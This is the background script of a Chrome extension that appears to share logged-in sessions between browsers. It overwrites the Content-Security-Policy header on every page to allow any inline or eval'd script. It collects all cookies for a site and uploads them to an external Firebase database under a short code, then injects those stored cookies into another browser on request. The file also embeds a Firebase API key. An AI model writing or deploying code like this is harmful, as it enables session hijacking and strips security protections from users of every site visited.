
function isCSPHeader(headerName) {
  return (headerName === 'CONTENT-SECURITY-POLICY') || (headerName === 'X-WEBKIT-CSP');
}
// Listens on new request
chrome.webRequest.onHeadersReceived.addListener((details) => {
  for (let i = 0; i < details.responseHeaders.length; i += 1) {
    if (isCSPHeader(details.responseHeaders[i].name.toUpperCase())) {
      const csp = 'default-src * \'unsafe-inline\' \'unsafe-eval\' data: blob:;';
      details.responseHeaders[i].value = csp;
    }
  }
  return { // Return the new HTTP header
    responseHeaders: details.responseHeaders,
  };
}, {
  urls: ['<all_urls>'],
  types: ['main_frame'],
}, ['blocking', 'responseHeaders']);

var firebaseConfig = {
  apiKey: "AIzaSyCp9ExzOVOuMu1Fi9qOXM7f5stWgG3_XQ8",
  authDomain: "better-tandem.firebaseapp.com",
  databaseURL: "https://better-tandem.firebaseio.com",
  storageBucket: "better-tandem.appspot.com",
};
// Initialize Firebase
firebase.initializeApp(firebaseConfig);
//var database = firebase.database();
var database = firebase.database();
chrome.runtime.onMessage.addListener(function(request, sender) {
  if (request.type == "cookies") {
    console.log(request.location.replace('https://',''));
    chrome.cookies.getAll({url: request.location}, function (cookies) {
      console.log(cookies);
      for (var i = 0; i < cookies.length; i++) {
        console.log(cookies[i]);
      }
      database.ref(request.shortCode).set({
        cookies: cookies,
      });
    });
  } else if (request.type == 'setCookies') {
    console.log('HERE MOTHAFUCKAS');
    database.ref(`${request.shortCode}`).on('value', function (snapshot) {
      snapshot.val().cookies.forEach(element => {
        console.log(element.domain);
        console.log(request.location.replace('https://', ''));
        chrome.cookies.set({
          "name": element.name,
          "url": request.location,
          "value": element.value,
        }, function(cookie) {
          console.log(JSON.stringify(cookie));
        })
      });
    });
  }
});
